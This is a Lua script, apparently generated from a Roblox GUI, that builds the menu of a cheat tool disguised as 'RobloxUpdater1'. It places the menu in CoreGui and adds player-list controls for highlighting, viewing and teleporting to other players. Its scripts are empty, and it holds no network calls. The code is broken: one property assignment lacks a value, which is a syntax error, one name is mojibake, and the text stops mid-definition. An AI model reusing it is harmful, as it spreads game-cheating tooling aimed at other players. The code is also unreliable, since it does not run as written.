

local UI = {}

-- // StarterGui.RobloxUpdater1 \\ --
UI["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
UI["1"]["DisplayOrder"] = 
UI["1"]["Name"] = [[RobloxUpdater1]]
UI["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
UI["1"]["ResetOnSpawn"] = false
UI["1"].Parent = game:GetService("CoreGui")

-- // StarterGui.RobloxUpdater1.B-W24 \\ --
UI["2"] = Instance.new("LocalScript", UI["1"])
UI["2"]["Name"] = [[B-W24]]

-- // StarterGui.RobloxUpdater1.AutoStart \\ --
UI["3"] = Instance.new("LocalScript", UI["1"])
UI["3"]["Name"] = [[AutoStart]]

-- // StarterGui.RobloxUpdater1.MainTab \\ --
UI["4"] = Instance.new("Frame", UI["1"])
UI["4"]["BorderSizePixel"] = 0
UI["4"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23)
UI["4"]["Size"] = UDim2.new(0, 574, 0, 311)
UI["4"]["Position"] = UDim2.new(0.35379, 0, 0.36529, 0)
UI["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["4"]["Name"] = [[MainTab]]

-- // StarterGui.RobloxUpdater1.MainTab.LoadingScreen \\ --
UI["5"] = Instance.new("Frame", UI["4"])
UI["5"]["Interactable"] = false
UI["5"]["ZIndex"] = 9
UI["5"]["BorderSizePixel"] = 0
UI["5"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34)
UI["5"]["Size"] = UDim2.new(0, 573, 0, 256)
UI["5"]["Position"] = UDim2.new(-0, 0, 0.17363, 0)
UI["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["5"]["Name"] = [[LoadingScreen]]

-- // StarterGui.RobloxUpdater1.MainTab.LoadingScreen.UICorner \\ --
UI["6"] = Instance.new("UICorner", UI["5"])


-- // StarterGui.RobloxUpdater1.MainTab.LoadingScreen.LoadingImage \\ --
UI["7"] = Instance.new("ImageLabel", UI["5"])
UI["7"]["ZIndex"] = 16
UI["7"]["BorderSizePixel"] = 0
UI["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["7"]["Image"] = [[rbxassetid://87789517038415]]
UI["7"]["Size"] = UDim2.new(0, 110, 0, 110)
UI["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["7"]["BackgroundTransparency"] = 1
UI["7"]["Name"] = [[LoadingImage]]
UI["7"]["Position"] = UDim2.new(0.42321, 0, 0.24219, 5)

-- // StarterGui.RobloxUpdater1.MainTab.LoadingScreen.LoadingImage.LocalScript \\ --
UI["8"] = Instance.new("LocalScript", UI["7"])


-- // StarterGui.RobloxUpdater1.MainTab.LoadingScreen.LocalScript \\ --
UI["9"] = Instance.new("LocalScript", UI["5"])


-- // StarterGui.RobloxUpdater1.MainTab.LoadingScreen.UIGradient \\ --
UI["a"] = Instance.new("UIGradient", UI["5"])
UI["a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Plate \\ --
UI["b"] = Instance.new("LocalScript", UI["4"])
UI["b"]["Name"] = [[Plate]]

-- // StarterGui.RobloxUpdater1.MainTab.TAS1.0 \\ --
UI["c"] = Instance.new("LocalScript", UI["4"])
UI["c"]["Name"] = [[TAS1.0]]

-- // StarterGui.RobloxUpdater1.MainTab.UICorner \\ --
UI["d"] = Instance.new("UICorner", UI["4"])
UI["d"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames \\ --
UI["e"] = Instance.new("Folder", UI["4"])
UI["e"]["Name"] = [[Frames]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server \\ --
UI["f"] = Instance.new("Frame", UI["e"])
UI["f"]["Visible"] = false
UI["f"]["BorderSizePixel"] = 0
UI["f"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["f"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["f"]["Position"] = UDim2.new(0.22573, 0, 0.15465, 0)
UI["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["f"]["Name"] = [[Server]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.UIGradient \\ --
UI["10"] = Instance.new("UIGradient", UI["f"])
UI["10"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ListPlayerFunction \\ --
UI["11"] = Instance.new("LocalScript", UI["f"])
UI["11"]["Name"] = [[ListPlayerFunction]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ListPlayerFunction.Templade \\ --
UI["12"] = Instance.new("TextButton", UI["11"])
UI["12"]["TextWrapped"] = true
UI["12"]["BorderSizePixel"] = 0
UI["12"]["TextSize"] = 35
UI["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["12"]["TextScaled"] = true
UI["12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["12"]["Size"] = UDim2.new(0, 150, 0, 33)
UI["12"]["BackgroundTransparency"] = 0.85
UI["12"]["Name"] = [[Templade]]
UI["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["12"]["Text"] = [[Player]]
UI["12"]["Position"] = UDim2.new(0.04217, 0, 0.02591, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ListPlayerFunction.Templade.UIStroke \\ --
UI["13"] = Instance.new("UIStroke", UI["12"])
UI["13"]["Transparency"] = 0.63
UI["13"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["13"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ListPlayerFunction.Templade.UICorner \\ --
UI["14"] = Instance.new("UICorner", UI["12"])
UI["14"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ListPlayerFunction.Templade.UIGradient \\ --
UI["15"] = Instance.new("UIGradient", UI["12"])
UI["15"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.SecPlayer \\ --
UI["16"] = Instance.new("StringValue", UI["f"])
UI["16"]["Name"] = [[SecPlayer]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame2 \\ --
UI["17"] = Instance.new("ScrollingFrame", UI["f"])
UI["17"]["Active"] = true
UI["17"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["17"]["BorderSizePixel"] = 0
UI["17"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["17"]["AutoLocalize"] = false
UI["17"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["17"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["17"]["Name"] = [[ScrollingFrame2]]
UI["17"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["17"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
UI["17"]["Size"] = UDim2.new(0, 166, 0, 190)
UI["17"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["17"]["Position"] = UDim2.new(0, 0, 0.22739, 0)
UI["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["17"]["ScrollBarThickness"] = 5
UI["17"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame2.UIPadding \\ --
UI["18"] = Instance.new("UIPadding", UI["17"])
UI["18"]["PaddingTop"] = UDim.new(0, 7)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame2.UIListLayout \\ --
UI["19"] = Instance.new("UIListLayout", UI["17"])
UI["19"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["19"]["Padding"] = UDim.new(0, 15)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.TEXT \\ --
UI["1a"] = Instance.new("TextLabel", UI["f"])
UI["1a"]["BorderSizePixel"] = 0
UI["1a"]["TextTransparency"] = 0.44
UI["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1a"]["TextSize"] = 28
UI["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1a"]["BackgroundTransparency"] = 1
UI["1a"]["Size"] = UDim2.new(0, 423, 0, 28)
UI["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1a"]["Text"] = [[Player Tab]]
UI["1a"]["Name"] = [[TEXT]]
UI["1a"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.TEXT.UICorner \\ --
UI["1b"] = Instance.new("UICorner", UI["1a"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.TEXT.Underline \\ --
UI["1c"] = Instance.new("Frame", UI["1a"])
UI["1c"]["BorderSizePixel"] = 0
UI["1c"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["1c"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["1c"]["Position"] = UDim2.new(0.26478, 0, 1.21429, 0)
UI["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1c"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.Underline \\ --
UI["1d"] = Instance.new("Frame", UI["f"])
UI["1d"]["BorderSizePixel"] = 0
UI["1d"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["1d"]["Size"] = UDim2.new(0, 3, 0, -193)
UI["1d"]["Position"] = UDim2.new(0.37613, 0, 0.96403, 0)
UI["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1d"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.UICorner \\ --
UI["1e"] = Instance.new("UICorner", UI["f"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame \\ --
UI["1f"] = Instance.new("ScrollingFrame", UI["f"])
UI["1f"]["Active"] = true
UI["1f"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["1f"]["BorderSizePixel"] = 0
UI["1f"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["1f"]["AutoLocalize"] = false
UI["1f"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["1f"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1f"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["1f"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y
UI["1f"]["Size"] = UDim2.new(0, 260, 0, 193)
UI["1f"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["1f"]["Position"] = UDim2.new(0.3973, 0, 0.227, 0)
UI["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1f"]["ScrollBarThickness"] = 5
UI["1f"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.UIPadding \\ --
UI["20"] = Instance.new("UIPadding", UI["1f"])
UI["20"]["PaddingTop"] = UDim.new(0, 7)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.UIListLayout \\ --
UI["21"] = Instance.new("UIListLayout", UI["1f"])
UI["21"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["21"]["Padding"] = UDim.new(0, 12)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.2Highlight \\ --
UI["22"] = Instance.new("TextButton", UI["1f"])
UI["22"]["BorderSizePixel"] = 0
UI["22"]["TextSize"] = 35
UI["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["22"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["22"]["Size"] = UDim2.new(0, 250, 0, 46)
UI["22"]["BackgroundTransparency"] = 0.85
UI["22"]["Name"] = [[2Highlight]]
UI["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["22"]["Text"] = [[Highlight : OFF]]
UI["22"]["Position"] = UDim2.new(0.41982, 0, 0.44632, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.2Highlight.Function \\ --
UI["23"] = Instance.new("LocalScript", UI["22"])
UI["23"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.2Highlight.Click Sound \\ --
UI["24"] = Instance.new("LocalScript", UI["22"])
UI["24"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.2Highlight.UIGradient \\ --
UI["25"] = Instance.new("UIGradient", UI["22"])
UI["25"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.2Highlight.UIStroke \\ --
UI["26"] = Instance.new("UIStroke", UI["22"])
UI["26"]["Transparency"] = 0.63
UI["26"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["26"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.2Highlight.UICorner \\ --
UI["27"] = Instance.new("UICorner", UI["22"])
UI["27"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.3TPTP \\ --
UI["28"] = Instance.new("TextButton", UI["1f"])
UI["28"]["BorderSizePixel"] = 0
UI["28"]["TextSize"] = 35
UI["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["28"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["28"]["Size"] = UDim2.new(0, 250, 0, 46)
UI["28"]["BackgroundTransparency"] = 0.85
UI["28"]["Name"] = [[3TPTP]]
UI["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["28"]["Text"] = [[TP To Player]]
UI["28"]["Position"] = UDim2.new(0.41982, 0, 0.67151, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.3TPTP.Function \\ --
UI["29"] = Instance.new("LocalScript", UI["28"])
UI["29"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.3TPTP.Click Sound \\ --
UI["2a"] = Instance.new("LocalScript", UI["28"])
UI["2a"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.3TPTP.UIGradient \\ --
UI["2b"] = Instance.new("UIGradient", UI["28"])
UI["2b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.3TPTP.UIStroke \\ --
UI["2c"] = Instance.new("UIStroke", UI["28"])
UI["2c"]["Transparency"] = 0.63
UI["2c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["2c"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.3TPTP.UICorner \\ --
UI["2d"] = Instance.new("UICorner", UI["28"])
UI["2d"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.4View \\ --
UI["2e"] = Instance.new("TextButton", UI["1f"])
UI["2e"]["BorderSizePixel"] = 0
UI["2e"]["TextSize"] = 35
UI["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["2e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["2e"]["Size"] = UDim2.new(0, 250, 0, 46)
UI["2e"]["BackgroundTransparency"] = 0.85
UI["2e"]["Name"] = [[4View]]
UI["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2e"]["Text"] = [[View]]
UI["2e"]["Position"] = UDim2.new(0.41982, 0, 0.22494, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.4View.Click Sound \\ --
UI["2f"] = Instance.new("LocalScript", UI["2e"])
UI["2f"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.4View.UIGradient \\ --
UI["30"] = Instance.new("UIGradient", UI["2e"])
UI["30"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.4View.UIStroke \\ --
UI["31"] = Instance.new("UIStroke", UI["2e"])
UI["31"]["Transparency"] = 0.63
UI["31"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["31"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.4View.UICorner \\ --
UI["32"] = Instance.new("UICorner", UI["2e"])
UI["32"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.4View.Function \\ --
UI["33"] = Instance.new("LocalScript", UI["2e"])
UI["33"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.1PlayerName \\ --
UI["34"] = Instance.new("TextLabel", UI["1f"])
UI["34"]["TextWrapped"] = true
UI["34"]["TextTruncate"] = Enum.TextTruncate.AtEnd
UI["34"]["BorderSizePixel"] = 0
UI["34"]["TextTransparency"] = 0.41
UI["34"]["TextScaled"] = true
UI["34"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["34"]["TextSize"] = 35
UI["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["34"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["34"]["BackgroundTransparency"] = 1
UI["34"]["Size"] = UDim2.new(0, 250, 0, 15)
UI["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["34"]["Text"] = [[No Player Selected]]
UI["34"]["Name"] = [[1PlayerName]]
UI["34"]["Position"] = UDim2.new(0.00962, 0, 0, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.1PlayerName.UICorner \\ --
UI["35"] = Instance.new("UICorner", UI["34"])
UI["35"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.1PlayerName.UIGradient \\ --
UI["36"] = Instance.new("UIGradient", UI["34"])
UI["36"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(187, 0, 4)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.5PlayerName \\ --
UI["37"] = Instance.new("TextLabel", UI["1f"])
UI["37"]["TextWrapped"] = true
UI["37"]["TextTruncate"] = Enum.TextTruncate.AtEnd
UI["37"]["BorderSizePixel"] = 0
UI["37"]["TextYAlignment"] = Enum.TextYAlignment.Top
UI["37"]["TextScaled"] = true
UI["37"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["37"]["TextSize"] = 30
UI["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["37"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["37"]["BackgroundTransparency"] = 0.85
UI["37"]["Size"] = UDim2.new(0, 250, 0, 250)
UI["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["37"]["Text"] = [[]]
UI["37"]["Name"] = [[5PlayerName]]
UI["37"]["Position"] = UDim2.new(0.00962, 0, 0, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.5PlayerName.UIGradient \\ --
UI["38"] = Instance.new("UIGradient", UI["37"])
UI["38"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.5PlayerName.UICorner \\ --
UI["39"] = Instance.new("UICorner", UI["37"])
UI["39"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.5PlayerName.LocalScript \\ --
UI["3a"] = Instance.new("LocalScript", UI["37"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.SerchBar \\ --
UI["3b"] = Instance.new("TextButton", UI["f"])
UI["3b"]["Active"] = false
UI["3b"]["BorderSizePixel"] = 0
UI["3b"]["TextSize"] = 41
UI["3b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["3b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["3b"]["Size"] = UDim2.new(0, 143, 0, 32)
UI["3b"]["BackgroundTransparency"] = 0.85
UI["3b"]["Name"] = [[SerchBar]]
UI["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["3b"]["Text"] = [[]]
UI["3b"]["Visible"] = false
UI["3b"]["Position"] = UDim2.new(0.02678, 0, 0.18946, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.SerchBar.UICorner \\ --
UI["3c"] = Instance.new("UICorner", UI["3b"])
UI["3c"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.SerchBar.UIGradient \\ --
UI["3d"] = Instance.new("UIGradient", UI["3b"])
UI["3d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.SerchBar.UIStroke \\ --
UI["3e"] = Instance.new("UIStroke", UI["3b"])
UI["3e"]["Transparency"] = 0.63
UI["3e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["3e"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.SerchBar.TextBox \\ --
UI["3f"] = Instance.new("TextBox", UI["3b"])
UI["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["3f"]["BorderSizePixel"] = 0
UI["3f"]["TextWrapped"] = true
UI["3f"]["TextSize"] = 30
UI["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["3f"]["PlaceholderText"] = [[Search]]
UI["3f"]["Size"] = UDim2.new(0, 143, 0, 32)
UI["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["3f"]["Text"] = [[]]
UI["3f"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.SerchBar.TextBox.UIGradient \\ --
UI["40"] = Instance.new("UIGradient", UI["3f"])
UI["40"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.SerchBar.TextBox.SerchScript \\ --
UI["41"] = Instance.new("LocalScript", UI["3f"])
UI["41"]["Enabled"] = false
UI["41"]["Name"] = [[SerchScript]]
UI["41"]["Disabled"] = true

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame \\ --
UI["42"] = Instance.new("Frame", UI["f"])
UI["42"]["BorderSizePixel"] = 0
UI["42"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["42"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["42"]["Position"] = UDim2.new(-0.00023, 0, -0.0013, 0)
UI["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["42"]["Name"] = [[BetaWarnFrame]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.TEXT \\ --
UI["43"] = Instance.new("TextLabel", UI["42"])
UI["43"]["BorderSizePixel"] = 0
UI["43"]["TextTransparency"] = 0.44
UI["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["43"]["TextSize"] = 28
UI["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["43"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["43"]["BackgroundTransparency"] = 1
UI["43"]["Size"] = UDim2.new(0, 444, 0, 23)
UI["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["43"]["Text"] = [[Warning]]
UI["43"]["Name"] = [[TEXT]]
UI["43"]["Position"] = UDim2.new(0, 0, 0.05319, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.TEXT.UICorner \\ --
UI["44"] = Instance.new("UICorner", UI["43"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.TEXT.Underline \\ --
UI["45"] = Instance.new("Frame", UI["43"])
UI["45"]["BorderSizePixel"] = 0
UI["45"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["45"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["45"]["Position"] = UDim2.new(0.27378, 0, 1.34472, 0)
UI["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["45"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.UICorner \\ --
UI["46"] = Instance.new("UICorner", UI["42"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.UIGradient \\ --
UI["47"] = Instance.new("UIGradient", UI["42"])
UI["47"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.closebutton \\ --
UI["48"] = Instance.new("TextButton", UI["42"])
UI["48"]["BorderSizePixel"] = 0
UI["48"]["TextSize"] = 20
UI["48"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["48"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["48"]["Size"] = UDim2.new(0, 168, 0, 50)
UI["48"]["BackgroundTransparency"] = 0.85
UI["48"]["Name"] = [[closebutton]]
UI["48"]["BorderColor3"] = Color3.fromRGB(255, 255, 255)
UI["48"]["Text"] = [[Continue]]
UI["48"]["Position"] = UDim2.new(0.30657, 0, 0.5916, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.closebutton.UICorner \\ --
UI["49"] = Instance.new("UICorner", UI["48"])
UI["49"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.closebutton.UIGradient \\ --
UI["4a"] = Instance.new("UIGradient", UI["48"])
UI["4a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 255, 9)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 255, 9))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.closebutton.UIStroke \\ --
UI["4b"] = Instance.new("UIStroke", UI["48"])
UI["4b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["4b"]["Thickness"] = 1.5

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.closebutton.Ã¼berschrift \\ --
UI["4c"] = Instance.new("TextLabel", UI["48"])
UI["4c"]["BorderSizePixel"] = 0
UI["4c"]["TextTransparency"] = 0.51
